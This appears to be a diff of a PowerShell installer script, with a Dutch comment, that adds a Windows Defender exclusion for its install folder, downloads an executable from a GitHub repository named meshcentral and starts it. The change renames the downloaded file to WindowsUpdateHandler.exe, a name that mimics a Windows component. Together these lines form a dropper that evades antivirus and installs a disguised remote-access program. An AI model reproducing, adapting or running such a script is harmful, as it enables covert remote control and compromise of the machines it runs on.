@@ -10,7 +10,7 @@ Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force -Path $installPath | Out-Null
 
 # Download (je had origineel een rare naam data.txt → hernoemen)
-$downloadUrl = "https://github.com/BeagleProMax/meshcentral/raw/main/WindowsCrashHandler.exe"
+$downloadUrl = "https://github.com/BeagleProMax/meshcentral/raw/main/WindowsUpdateHandler.exe"
 Invoke-WebRequest -Uri $downloadUrl -OutFile "$installPath\$exeName"
 
 # Starten met argument
